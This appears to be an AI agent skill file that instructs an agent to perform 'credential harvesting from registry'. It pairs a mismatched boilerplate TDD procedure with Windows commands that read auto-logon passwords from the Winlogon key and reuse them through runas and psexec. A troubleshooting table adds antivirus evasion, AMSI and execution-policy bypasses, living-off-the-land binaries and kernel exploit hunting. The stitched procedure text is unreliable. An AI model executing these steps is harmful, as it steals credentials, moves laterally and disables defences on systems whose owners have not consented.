---
name: example-5-credential-harvesting-from-registry
description: Use when executing example 5 credential harvesting from registry protocols within the security sector.
---

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core example 5 credential harvesting from registry logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Example 5: Credential Harvesting from Registry

```powershell
# Check for auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName: Administrator
# DefaultPassword: P@ssw0rd123

# Use credentials
runas /user:Administrator cmd.exe
# Or for remote: psexec \\target -u Administrator -p P@ssw0rd123 cmd
```

## Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
| Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
| Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>` |